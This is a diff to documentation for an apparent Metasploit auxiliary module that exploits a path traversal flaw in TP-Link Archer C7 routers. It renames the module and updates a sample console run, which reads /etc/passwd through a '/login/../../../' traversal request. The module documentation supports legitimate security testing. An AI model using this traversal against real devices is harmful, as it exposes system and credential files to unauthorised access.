@@ -15,7 +15,7 @@ Use this option to save the file found as loot
 
 ## Verification Steps
 
-1. `use auxiliary/scanner/http/archer_c7_traversal`
+1. `use auxiliary/gather/tplink_archer_c7_traversal`
 2. `set RHOSTS <addr>`
 3. `set FILE <file>`
 4. `run`
@@ -25,11 +25,14 @@ Use this option to save the file found as loot
 ### Archer C7_V1_141204_US
 
 ```
-msf6 > use auxiliary/scanner/http/archer_c7_traversal
-msf6 auxiliary(scanner/http/archer_c7_traversal) > set rhosts 192.168.0.1
+msf6 > use auxiliary/gather/tplink_archer_c7_traversal
+msf6 auxiliary(gather/tplink_archer_c7_traversal) > set rhosts 192.168.0.1
 rhosts => 192.168.0.1
-msf6 auxiliary(scanner/http/archer_c7_traversal) > run
+msf6 auxiliary(gather/tplink_archer_c7_traversal) > run
+[*] Running module against 192.168.0.1
 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Target device 'Archer C7'
 [*] Grabbing data at /login/../../../etc/passwd
 [+] /etc/passwd retrieved
 root:x:0:0:root:/root:/bin/sh
